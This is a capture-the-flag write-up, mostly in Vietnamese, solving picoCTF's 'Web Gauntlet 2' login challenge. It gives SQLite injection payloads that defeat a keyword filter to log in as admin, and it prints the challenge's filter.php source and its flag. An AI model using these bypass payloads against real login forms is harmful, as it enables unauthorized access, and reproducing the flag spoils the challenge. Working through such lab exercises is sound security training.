# Web Gauntlet 2

## Description

This website looks familiar... 
Log in as admin Site: http://mercury.picoctf.net:21336/ 
Filter: http://mercury.picoctf.net:21336/filter.php

## Hint

I tried to make it a little bit less contrived since the mini competition.
Each filter is separated by a space. Spaces are not filtered.
There is only 1 round this time, when you beat it the flag will be in filter.php.
There is a length component now.
sqlite

## Points

170 points

## Solution

Ta có một form đăng nhập như thường lệ , mình sẽ nhập bất kì vào để xem form hoạt động ra sao . Kết quả xuất hiện một thông báo **not admin** và đặc biệt hơn là nó còn xuất hiện câu truy vẫn phía sau . Đến đây ta có thể khẳng định rằng nó là một chall SQLi.

![img](image/mg1.png)

Tuy nhiên bạn không thể nhập bất cứ cái gì vào cũng được vì nó đã filter một số câu truy vấn và kí tự đặc biệt.

> Filters: *or and true false union like = > < ; -- /* */ admin*

Rõ ràng bạn có thể thấy nó filter hầu hết các kí tự command vì đây là dạng SQLi xác thực lên vector sẽ là bypass cái form bằng cách nào đó .
Ban đầu mk đã thử khá nhiều cách bypass user và bỏ qua phần passwd điều này đưa mk đến bế tắc và may mắn thay sau khi đc hint từ anh nhienit thì mk mới vỡ ra là cần bypass cả user và passwd.

Ta có hint bài cho là **sqlite** và sau một hồi google thì mk đã yimf ra được hướng đi (https://www.sqlite.org/lang_expr.html) .

Với user vì đề filter *admin* nên ta sẽ bypass bằng cách nối chuỗi , cụ thể:
> adm'||'in

Với passwd ta sẽ bypass bằng toán tử *IS NOT* nó hoạt động giống như *!=*, ý tưởng là ta sẽ so sánh một kí tự với *NULL* khi đó *IS NOT* sẽ trả về True , cụ thể :
> x' IS NOT 'NULL

QUERY :
> SELECT username, password FROM users WHERE username='adm'||'in' AND password='x' IS NOT 'NULL'

Sau khi bypass xong , ta sẽ vào trang filter.php và get flag !!!

> filter.php
```
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}
?>
```
DONE!





